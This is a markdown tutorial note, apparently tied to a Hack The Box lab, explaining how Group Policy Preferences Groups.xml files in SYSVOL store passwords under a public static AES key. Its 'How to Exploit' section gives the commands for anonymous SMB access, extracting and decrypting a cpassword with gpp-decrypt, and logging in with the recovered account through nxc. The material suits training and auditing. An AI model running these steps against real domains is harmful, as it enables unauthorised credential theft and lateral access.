`Groups.xml` is a configuration file created by **Group Policy Preferences** (GPP) in Windows domains.  
It is used to define local or domain user/group modifications that should be applied to machines within the scope of a Group Policy Object (GPO).

GPP stores its configuration files inside the domain's `SYSVOL` share, which is readable by all authenticated users and, in some cases, by anonymous sessions.

---

## File Location

Typical path inside SYSVOL:

```
\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\Machine\Preferences\Groups\Groups.xml
```

In some environments (including CTFs), it may also appear in:

```
\\<domain>\Replication\
```

This occurs when SYSVOL replication is exposed through a share.

---

## Purpose of Groups.xml

The file defines actions such as:

- Creating a local user
- Updating a domain user
- Adding a user to a local group
- Setting account flags (disabled, password never expires, etc.)

Example structure:

```xml
<Groups>
  <User name="DOMAIN\User" ... >
    <Properties 
        action="U"
        userName="DOMAIN\User"
        cpassword="BASE64_ENCODED_AES_PASSWORD"
        ... />
  </User>
</Groups>
```

The critical element is:

```
cpassword="..."
```

This field contains a password encrypted using a **static AES key** embedded in all versions of Windows that supported GPP.

---

## How to Exploit 

### Step 1: Access the SYSVOL or Replication share

Example:

```
smbclient //DC/SYSVOL -N
```

or

```
smbclient //DC/Replication -N
```

### Step 2: Locate the file

```
cd <domain>
cd Policies
find . -name Groups.xml
```

### Step 3: Extract the cpassword value

Example:

```
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

### Step 4: Decrypt the password

Using `gpp-decrypt`:

```
gpp-decrypt <cpassword>
```

Or using a Python script that implements the public AES key.

### Step 5: Use the recovered credentials

Once decrypted, the password belongs to the user defined in the XML:

```
userName="active.htb\SVC_TGS"
```

You can authenticate via SMB, LDAP, Kerberos, WinRM, etc.

Example:

```
nxc smb <ip> -u SVC_TGS -p '<password>'
```
